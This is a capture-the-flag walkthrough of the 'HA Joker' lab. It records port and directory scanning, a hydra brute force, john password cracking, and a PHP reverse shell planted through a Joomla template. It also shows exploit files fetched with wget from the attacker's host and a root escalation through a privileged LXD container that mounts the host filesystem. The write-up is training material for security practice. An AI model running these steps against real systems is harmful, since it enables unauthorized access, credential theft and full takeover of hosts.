@@ -1,0 +1,454 @@
+HA JOKER CTF.	
+
+
+
+[>>> TASK 1: HA JOKER CTF]
+[1.1. ENUMERATE SERVICES ON TARGET MACHINE]
+[ACTION: quick nmap all port scan]
+nmap -sS -T4 -sV -p- 10.10.156.220
+[OUTPUT]
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+8080/tcp open  http    Apache httpd 2.4.29
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+[1.2. WHAT VERSION OF APACHE IS IT?]
+[ANSWER (based on last output)]
+2.4.29
+
+
+
+[1.3. WHAT PORT ON THIS MACHINE NOT NEED TO BE AUTHENTICATED BY USER AND PASSWORD?]
+[ANSWER]
+80
+[NOTE]
+Answer is 2 digit, so it can't be 8080. It is 80 (http) since 22 serves ssh (authentication required).
+
+
+
+[1.4. THERE IS A FILE ON THIS PORT THAT SEEMS TO BE SECRET, WHAT IS IT?]
+[ACTION: quick gobuster scan for common directories]
+gobuster dir -u http://10.10.156.220 -w /usr/share/seclists/Discovery/Web-Content/common.txt
+[OUTPUT]
+/.hta                 (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/css                  (Status: 301) [Size: 312] [--> http://10.10.156.220/css/]
+/img                  (Status: 301) [Size: 312] [--> http://10.10.156.220/img/]
+/index.html           (Status: 200) [Size: 5954]
+/phpinfo.php          (Status: 200) [Size: 94771]
+/server-status        (Status: 403) [Size: 278]
+[NOTE]
+Nothing relevant.
+
+
+[ACTION: gobuster scan for files]
+gobuster dir -u http://10.10.156.220 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
+[OUTPUT]
+/index.html           (Status: 200) [Size: 5954]
+/.htaccess            (Status: 403) [Size: 278]
+/phpinfo.php          (Status: 200) [Size: 94771]
+/.                    (Status: 200) [Size: 5954]
+/.html                (Status: 403) [Size: 278]
+/.php                 (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/.htm                 (Status: 403) [Size: 278]
+/.htpasswds           (Status: 403) [Size: 278]
+/.htgroup             (Status: 403) [Size: 278]
+/wp-forum.phps        (Status: 403) [Size: 278]
+/.htaccess.bak        (Status: 403) [Size: 278]
+/.htuser              (Status: 403) [Size: 278]
+/.ht                  (Status: 403) [Size: 278]
+/.htc                 (Status: 403) [Size: 278]
+[NOTE]
+Nothing useful.
+
+
+[ACTION: gobuster file with extension scan]
+gobuster dir -u http://10.10.156.220 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,bak,zip
+[NOTE]
+No useful output.
+
+
+[ACTION: longer gobuster directory scan]
+gobuster dir -u http://10.10.156.220 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[OUTPUT]
+/img                  (Status: 301) [Size: 312] [--> http://10.10.156.220/img/]
+/css                  (Status: 301) [Size: 312] [--> http://10.10.156.220/css/]
+/server-status        (Status: 403) [Size: 278]
+
+
+[ACTION: common file scan]
+gobuster dir -u http://10.10.156.220 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php,html,zip
+[OUTPUT (snippet)]
+/secret.txt           (Status: 200) [Size: 320]
+[ANSWER]
+secret.txt
+
+
+
+[1.5. THERE IS ANOTHER FILE WHICH REVEALS INFORMATION OF THE BACKEND, WHAT IS IT?]
+[ANSWER (based on last question's outputs)]
+phpinfo.php
+
+
+
+
+[1.6. WHEN READING A SECRET FILE, WE FIND WITH A CONVERSATION THAT SEEMS CONTAINS AT LEAST TWO USERS AND SOME KEYWORDS THAT CAN BE INTERESTING, WHAT USER DO YOU THINK IT IS?]
+[ACTION: visit http://10.10.156.220/secret.txt]
+[OUTPUT]
+Batman hits Joker.
+Joker: "Bats you may be a rock but you won't break me." (Laughs!)
+Batman: "I will break you with this rock. You made a mistake now."
+Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
+Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
+[ANSWER]
+joker
+
+
+
+[1.7. WHAT PORT ON THIS MACHINE NEED TO BE AUTHENTICATED BY BASIC AUTHENTICATION MECHANISM?]
+[NOTE]
+Basic Auth is built into the http protocol.
+Answer has 4 digit length, it can't be 80.
+[ANSWER]
+8080
+
+
+
+[1.8. AT THIS POINT WE HAVE ONE USER AND A URL THAT NEEDS TO BE UNAUTHENTICATED, BRUTE FORCE IT TO GET THE PASSWORD, WHAT IS THAT PASSWORD?]
+[ACTION: visit http://10.10.156.220:8080/]
+We get a login form on a popup.
+
+
+[NOTE]
+Login is done via popup, not html form. So the right hydra module is http-get, not http-post-form.
+[ACTION: bruteforce joker password]
+hydra -l joker -P ~/thm/rockyou.txt -s 8080 10.10.156.220 http-get
+[OUTPUT]
+[8080][http-get] host: 10.10.156.220   login: joker   password: hannah
+[ANSWER]
+hannah
+
+
+
+[1.9. YEAH! WE GOT THE USER AND PASSWORD AND WE SEE A CMS BASED BLOG. NOW CHECK FOR DIRECTORIES AND FILES IN THIS PORT. WHAT DIRECTORY LOOKS LIKE AS ADMIN DIRECTORY?]
+[ACTION: explore http://10.10.156.220:8080/]
+Doing a bit of reading, we find a clear callout to the admin directory.
+[OUTPUT]
+Site and Administrator
+Your site actually has two separate sites. The site (also called the front end) is what visitors to your site will see. The administrator (also called the back end) is only used by people managing your site. You can access the administrator by clicking the "Site Administrator" link on the "User Menu" menu (visible once you login) or by adding /administrator to the end of your domain name. The same user name and password are used for both sites.
+[ANSWER]
+/administrator/
+
+
+
+[1.10. WE NEED ACCESS TO THE ADMINISTRATION OF THE SITE IN ORDER TO GET A SHELL THERE IS A BACKUP FILE, WHAT IS THIS FILE?]
+[ACTION: gobuster common scan with extensions (targeting backup like files)]
+gobuster dir -u http://10.10.156.220:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt -U joker -P hannah -x bak,old,zip,tar,gz,rar,7z,tmp,inc,swp,save
+[OUTPUT (snippet)]
+/.htpasswd.inc        (Status: 403) [Size: 280]
+/.htpasswd.save       (Status: 403) [Size: 280]
+/LICENSE              (Status: 200) [Size: 18092]
+/README               (Status: 200) [Size: 4494]
+/administrator        (Status: 301) [Size: 329] [--> http://10.10.156.220:8080/administrator/]
+/backup.zip           (Status: 200) [Size: 12133560]
+/backup               (Status: 200) [Size: 12133560]
+/bin                  (Status: 301) [Size: 319] [--> http://10.10.156.220:8080/bin/]
+/cache                (Status: 301) [Size: 321] [--> http://10.10.156.220:8080/cache/]
+Progress: 13515 / 56964 (23.73%)^C
+[ANSWER]
+backup.zip
+
+
+[1.11. WE HAVE THE BACKUP FILE AND NOW WE SHOULD LOOK FOR SOME INFORMATION, FOR EXAMPLE DATABASE, CONFIGURATION FILES, ETC ... BUT THE BACKUP FILE SEEMS TO BE ENCRYPTED. WHAT IS THE PASSWORD?]
+[ACTION: visit http://10.10.156.220:8080/backup.zip  to download it]
+
+
+[NOTE]
+We don't have any clue as to what the password might be.
+we will attempt to crack it with john.
+[ACTION: get zip hash]
+zip2john backup.zip > backup_hash.txt
+
+
+[ACTION: crack hash]
+john --wordlist=~/thm/rockyou.txt backup_hash.txt
+[OUTPUT]
+hannah           (backup.zip)     
+[ANSWER]
+hannah
+
+
+[ACTION: open zip]
+mkdir backup && unzip backup.zip -d backup
+
+
+
+[1.12. REMEMBER THAT... WE NEED ACCESS TO THE ADMINISTRATION OF THE SITE... BLAH BLAH BLAH. IN OUR NEW DISCOVERY WE SEE SOME FILES THAT HAVE COMPROMISING INFORMATION, MAYBE DB? OK WHAT IF WE DO A RESTORATION OF THE DATABASE! SOME TABLES MUST HAVE SOMETHING LIKE USER_TABLE! WHATIS THE SUPER DUPER USER?]
+[ACTION: move into backup folder and browse database]
+cd backup/db/
+ls
+[OUTPUT]
+joomlabd.sql
+
+
+[ACTION: search for user related tables]
+grep "user" joomladb.sql
+[OUTPUT (snippet)]
+-- Table structure for table `cc1gr_users`
+DROP TABLE IF EXISTS `cc1gr_users`;
+CREATE TABLE `cc1gr_users` (
+  `username` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
+  `requireReset` tinyint(4) NOT NULL DEFAULT '0' COMMENT 'Require user to reset password on next login',
+  KEY `username` (`username`),
+-- Dumping data for table `cc1gr_users`
+LOCK TABLES `cc1gr_users` WRITE;
+/*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */;
+INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
+/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;
+[ANSWER]
+admin
+[NOTE]
+Looks lke we could have grepped directly for "Super Duper User" instead of reading manually...
+
+
+
+[1.13. SUPER DUPER USER! WHAT IS THE PASSWORD?]
+[NOTE]
+From last question output, we get admin's password hash: $2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG
+We will crack it via john.
+[ACTION: save hash to duper_hash.txt]
+echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > duper_hash.txt
+
+
+[ACTION: crack hash]
+john --wordlist=~/thm/rockyou.txt duper_hash.txt 
+[OUTPUT]
+abcd1234         (?)     
+[ANSWER]
+abcd1234
+
+
+[NOTE]
+Restarted the machine.
+New ip: 10.10.163.75
+[1.14. AT THIS POINT YOU SHOULD UPLOAD A REVERSE-SHELL IN ORDER TO GAIN SHELL ACCESS. WHAT IS THE OWNER OF THIS SESSION?]
+[ACTION: log in to http://10.10.163.75:8080/administrator/]
+Creds: admin|abcd1234
+[NOTE]
+We get redirected to http://10.10.163.75:8080/administrator/index.php
+
+
+
+[NOTE]
+Since we are asked to upload a rev shell, we need to find some place to upload a php shell.
+[ACTION: research file uploads in joomla admin dashboard]
+[NOTE]
+We find Content > Media, where we can upload (http://10.10.163.75:8080/administrator/index.php)
+We will use the pentestmonkey php rev shell.
+Remember to update $ip to your ip, and keep note of port 1234.
+
+
+[NOTE]
+After attempting to upload the shell multiple times, it still didn't show up in the media folder.
+There must be some setting preventing us from uploading properly.
+[ACTION: add .php as allowed extension]
+Options > Legal Extensions (File Types)
+Add: php,
+Save & Close
+
+
+[NOTE]
+Upload failed again, so I review the settings once more.
+I disabled Restrict Uploads.
+I also disbled Check MIME Types, and added php to Legal Image Extensions, but no success.
+[ACTION: add shell via template]
+Extensions > Templates > Templates > Protostar Details and Files > New File 
+[NOTE]
+We have 2 options: create a file, and upload a file.
+File upload file with error:
+"Error
+No file was found.
+Failed to upload file."
+So I will just create a .php and paste the script.
+
+
+[ACTION: add script to template]
+Steps:
+1. Choose any file name and extension php: script php.
+2. Create.
+3. Paste our code.
+4. Save.
+5. Save & Close.
+[OUTPUT]
+Message
+File successfully saved.
+
+
+[ACTION: spawn shell]
+Visit: http://10.10.163.75:8080/templates/protostar/script.php
+[OUTPUT]
+$
+
+
+[ACTION: stabilize shell]
+export TERM=xterm
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl + z
+stty raw -echo; fg
+
+
+[ACTION: check owner of session (displayed after spawning bash)]
+whoami
+[OUTPUT]
+www-data
+
+
+
+[1.15. THIS USER BELONGS TO A GROUP THAT DIFFERS ON YOUR OWN GROUP. WHAT IS THIS GROUP?]
+[ACTION: check current user's groups]
+groups
+[OUTPUT]
+www-data lxd
+[ANSWER]
+lxd
+
+
+
+[1.16. SPAWN A TTY SHELL.]
+[NOTE]
+We already did it stabilizing the shell in 1.14.
+
+
+
+[1.17. IN THIS QUESTION, YOU SHOULD BE DO A BASIC RESEARCH ON HOW LINUX CONTAINERS (LXD) WORK, IT HAS A SMALL ONLINE TUTORIAL. GOOGLING "LXD TRY IT ONLINE"]
+[ACTION: go to https://linuxcontainers.org/incus/try-it/ and test as requested]
+
+
+[1.18. RESEARCH HOW TO ESCALATE PRIVILEGES USING LXD PERMISSIONS AND CHECK TO SEE IF THERE ARE ANY IMAGES AVAILABLE ON THE BOX]
+[ACTION: list local images]
+lxc image list
+[OUTPUT]
++-------+-------------+--------+-------------+------+------+-------------+
+| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
++-------+-------------+--------+-------------+------+------+-------------+
+[NOTE]
+No lxd images cached locally.
+
+
+[ACTION: research privesc via lxd]
+[OUTPUT]
+I found https://github.com/initstring/lxd_root.
+The repo has 2 exploits, lxd_rootv1.sh, and lxd_rootv2.py
+v1 explained: mounts the host / filesystem into a container, where the host's low-privilege user has root access. This root access maps back to the host, allowing the current user to be added to the /etc/sudoers file. This has been exploited by others before me.
+v2 explained: mounts the host's systemd private UNIX socket into a container and then back to the host again via LXD proxy devices. These proxy devices have root privileges, and they pass their credentials during socket communications, as opposed to the credentials of the initiating low-privilege user. This is abused to create a temporary systemd service that adds the current user to the /etc/sudoers file.
+v1 usage: $ bash lxd_rootv1.sh <container name>
+v2 usage: $ python3 lxd_rootv2.py <container name>
+
+
+[NOTE]
+I will try to use v1.
+[ACTION: start listener]
+python -m http.server 8080
+
+
+[ACTION: download script]
+wget http://10.23.25.109:8080/lxd_rootv1.sh -O /tmp/lxd_rootv1.sh
+
+
+[ACTION: run exploit]
+cd /tmp
+chmod +x lxd_rootv1.sh
+bash lxd_rootv1.sh
+[OUTPUT]
+lxd_rootv1.sh <container name>
+
+The exploit currently requires an existing container.
+
+
+[NOTE]
+We will try to crate a basic container and rerun the exploit.
+[ACTION: create container]
+lxc launch ubuntu:20.04 mycontainer
+[OUTPUT]
+Error: Failed container creation: Get https://cloud-images.ubuntu.com/releases/streams/v1/index.json: Unable to connect to: cloud-images.ubuntu.com:443
+
+
+[ACTION: list image from remote source]
+lxc image copy images:ubuntu/22.04 local: --alias ubuntu2204
+[OUTPUT]
+Error: Get https://images.linuxcontainers.org/streams/v1/index.json: Unable to connect to: images.linuxcontainers.org:443
+[NOTE]
+Looks like we need to find a way to exploit without a running container or spawning one.
+
+
+[ACTION: (local) download alpine linux container image]
+git clone https://github.com/saghul/lxd-alpine-builder.git
+
+
+[ACTION: start server]
+python3 -m http.server 80
+
+
+[ACTION: download image file (alpine-v3.13-x86_64-20210218_0139.tar.gz) to machine]
+wget 10.23.25.109/lxd-alpine-builder/alpine-v3.13-0210218_0139.tar.gz
+
+
+[ACTION: import container into lxd environment and give it alias (myimage)]
+lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+
+
+[ACTION: check if image was added properly]
+lxc image list
+[OUTPUT]
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Jul 27, 2025 at 8:03am (UTC) |
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+
+
+[ACTION: privesc via lxd]
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+[OUTPUT]
+~ # 
+
+
+
+[1.19. THE IDEA HERE IS TO MOUNT THE ROOT OF THE OS FILE SYSTEM ON THE CONTAINER, THIS SHOULD GIVE US ACCESS TO THE ROOT DIRECTORY. CREATE THE CONTAINER WITH THE PRIVILEGE TRUE AND MOUNT THE ROOT FILE SYSTEM ON /MNT IN ORDER TO GAIN ACCESS TO /ROOT DIRECTORY ON THE HOST MACHINE]
+Nothing to do here.
+
+
+[1.20. WHAT IS THE NAME OF THE FILE IN THE /root DIRECTORY?]
+[ACTION: check root directory content]
+ls -la /root
+[OUTPUT]
+drwx------    2 root     root          4096 Jul 27 08:07 .
+drwxr-xr-x   19 root     root          4096 Jul 27 08:04 ..
+-rw-------    1 root     root            42 Jul 27 08:07 .ash_history
+
+
+[NOTE]
+This isn't the actual filesystem (it's the containers), that's why we don't see the requested file.
+[ACTION: move into machine (/mnt/root directory) and check its /root content]
+cd /mnt/root/; ls -la
+[OUTPUT]
+drwx------    5 root     root          4096 Oct 25  2019 .
+drwxr-xr-x   22 root     root          4096 Oct 22  2019 ..
+-rw-------    1 root     root            40 Oct 25  2019 .bash_history
+-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc
+drwx------    2 root     root          4096 Oct 22  2019 .cache
+drwxr-x---    3 root     root          4096 Oct 24  2019 .config
+drwxr-xr-x    3 root     root          4096 Oct  8  2019 .local
+-rw-------    1 root     root            33 Oct 24  2019 .mysql_history
+-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
+-rw-r--r--    1 root     root          1003 Oct  8  2019 final.txt
+[ANSWER]
+final.txt
